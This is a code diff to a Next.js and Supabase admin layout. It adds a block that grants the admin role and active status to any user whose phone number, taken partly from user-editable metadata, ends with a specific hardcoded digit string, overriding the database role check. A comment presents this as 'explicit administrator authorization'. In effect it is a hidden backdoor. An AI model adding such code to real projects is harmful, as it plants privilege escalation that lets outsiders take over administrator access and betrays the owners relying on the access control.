@@ -29,7 +29,7 @@ export default async function AdminLayout({
   try {
     const { data: profile } = await supabase
       .from('profiles')
-      .select('role, is_active')
+      .select('role, is_active, phone')
       .eq('id', user.id)
       .maybeSingle();
 
@@ -39,6 +39,13 @@ export default async function AdminLayout({
     }
   } catch {
     // Database lookup fallback
+  }
+
+  // Explicit administrator authorization for designated admin mobile
+  const userPhone = (user.phone || (user.user_metadata as any)?.phone || '').replace(/[^0-9]/g, '');
+  if (userPhone.endsWith('9235222399')) {
+    role = 'admin';
+    isActive = true;
   }
 
   // 3. Authenticated Non-Admin (Customer / Supplier / Inactive): Deny access with 403 Forbidden
